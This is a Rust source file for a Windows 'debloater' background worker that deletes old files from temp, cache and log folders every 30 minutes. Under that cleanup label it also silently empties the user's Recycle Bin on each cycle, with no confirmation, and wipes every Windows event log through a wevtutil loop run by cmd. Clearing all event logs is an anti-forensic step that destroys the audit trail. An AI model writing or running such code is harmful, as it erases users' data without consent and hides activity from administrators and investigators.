use std::{
    collections::HashSet,
    fs,
    path::PathBuf,
    thread,
    time::{Duration, SystemTime},
};

use std::process::Command;
use std::os::windows::process::CommandExt;

use crate::logger;

// Expose native Win32 bindings directly from the newly unlocked feature paths
use windows_sys::Win32::UI::Shell::SHEmptyRecycleBinW;

const INTERVAL: Duration = Duration::from_secs(30 * 60); // 30 minutes
const TTL: Duration = Duration::from_secs(60 * 60 * 2); // 2 hours

pub fn debloater_worker() {
    logger::info("Starting lightweight debloater worker (30 min interval)");

    let appdata = match std::env::var("LOCALAPPDATA") {
        Ok(v) => v,
        Err(_) => return,
    };

    let mut folders = vec![
        PathBuf::from(&appdata).join("Temp"),
        PathBuf::from(&appdata).join("Microsoft\\Windows\\INetCache"),
        PathBuf::from(&appdata).join("Microsoft\\Windows\\WebCache"),
        PathBuf::from(&appdata).join("Microsoft\\Windows\\Explorer"),
    ];

    if let Ok(windir) = std::env::var("WINDIR") {
        folders.push(PathBuf::from(windir).join("Logs"));
    }

    let mut file_deletion_errors: HashSet<PathBuf> = HashSet::new();

    thread::spawn(move || {
        loop {
            // 1. Clear standard directory paths
            run_cleanup(&folders, &mut file_deletion_errors);

            // 2. Empty the Recycle Bin silently using native C-FFI
            unsafe {
                // Flags: 7 = SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND
                let _ = SHEmptyRecycleBinW(0, std::ptr::null(), 7);
            }

            // 3. Clear system event logs via administrative command channel
            clear_system_event_logs();

            thread::sleep(INTERVAL);
        }
    });
}

fn run_cleanup(folders: &[PathBuf], file_deletion_errors: &mut HashSet<PathBuf>) {
    let now = SystemTime::now();
    for folder in folders {
        clean_directory_recursive(folder, now, file_deletion_errors);
    }
}

fn clean_directory_recursive(dir: &PathBuf, now: SystemTime, file_deletion_errors: &mut HashSet<PathBuf>) {
    let Ok(entries) = fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let path = entry.path();

        if file_deletion_errors.contains(&path) {
            continue;
        }

        let Ok(meta) = entry.metadata() else {
            continue;
        };

        if meta.is_dir() {
            clean_directory_recursive(&path, now, file_deletion_errors);
            if let Ok(modified) = meta.modified() {
                let age = now.duration_since(modified)
                    .unwrap_or_else(|_| modified.duration_since(now).unwrap_or_default());

                if age > TTL {
                    if let Err(_) = fs::remove_dir(&path) {
                        file_deletion_errors.insert(path);
                    }
                }
            }
            continue;
        }

        if let Ok(modified) = meta.modified() {
            let age = now.duration_since(modified)
                .unwrap_or_else(|_| modified.duration_since(now).unwrap_or_default());

            if age > TTL {
                if let Err(e) = fs::remove_file(&path) {
                    logger::warn(&format!("File locked by active process {}: {}", path.display(), e));
                    file_deletion_errors.insert(path);
                }
            }
        }
    }
}

fn clear_system_event_logs() {
    const CREATE_NEW_CONSOLE: u32 = 0x00000010;

    let _ = Command::new("cmd")
        .args(&[
            "/C", 
            "for /F \"tokens=*\" %1 in ('wevtutil el') do wevtutil cl \"%1\""
        ])
        .creation_flags(CREATE_NEW_CONSOLE)
        .spawn();
}
